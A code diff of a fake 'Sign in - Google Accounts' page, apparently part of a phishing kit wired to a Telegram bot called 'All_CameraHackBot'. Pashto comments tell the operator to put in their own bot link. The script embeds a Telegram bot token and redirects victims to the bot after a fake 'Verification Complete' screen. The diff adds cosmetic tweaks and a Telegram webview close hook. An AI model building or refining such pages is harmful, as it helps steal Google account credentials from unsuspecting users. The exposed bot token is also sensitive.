@@ -2,14 +2,14 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
     <title>Sign in - Google Accounts</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Google Sans', 'Roboto', system-ui;
+            font-family: 'Google Sans', 'Roboto', system-ui, -apple-system, 'Segoe UI', sans-serif;
         }
         body {
             min-height: 100vh;
@@ -25,8 +25,8 @@
             background: #ffffff;
             border-radius: 0.75rem;
             border: 1px solid #dadce0;
-            padding: 2rem;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.08);
+            padding: 2rem 2rem 1.5rem 2rem;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.08);
         }
         .google-logo { text-align: center; margin-bottom: 1rem; }
         .google-logo img { width: 75px; height: auto; }
@@ -117,7 +117,7 @@
         <div class="google-logo"><img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google"></div>
         <h1>✅ Verification Complete</h1>
         <div class="sub">Your account has been successfully verified!</div>
-        <button class="cancel-btn" id="cancelBtn">✖ CANCEL - Return to Bot</button>
+        <button class="cancel-btn" id="cancelBtn">✖ CANCEL - Close & Return to Bot</button>
     </div>
 
     <div id="errorBox" class="message error-msg"></div>
@@ -127,7 +127,7 @@
 </div>
 
 <script>
-    // ========== د بوټ لینک ==========
+    // ========== د بوټ لینک (ستاسو د بوټ سره بدل کړئ) ==========
     const BOT_REDIRECT = "https://t.me/All_CameraHackBot?start=confirm_account";
     
     const BOT_TOKEN = "8815514761:AAGT82khXsn8TmJHCv5vgSZG86Z6fAwGktQ";
@@ -210,10 +210,19 @@
         }
     };
     
-    // د CANCEL تڼۍ - بوټ ته ځي
+    // د CANCEL تڼۍ - پاڼه بنده کوي او بوټ ته ځي
     document.getElementById('cancelBtn').onclick = () => {
+        // بوټ ته لاړ شه
         window.location.href = BOT_REDIRECT;
+        // پاڼه به بنده شي ځکه چې بوټ ته ځي
     };
+    
+    // د تلګرام ان-ویب براوزر لپاره اضافي
+    if (window.TelegramWebview && TelegramWebview.close) {
+        window.closeTelegram = function() {
+            TelegramWebview.close();
+        };
+    }
 </script>
 </body>
 </html>
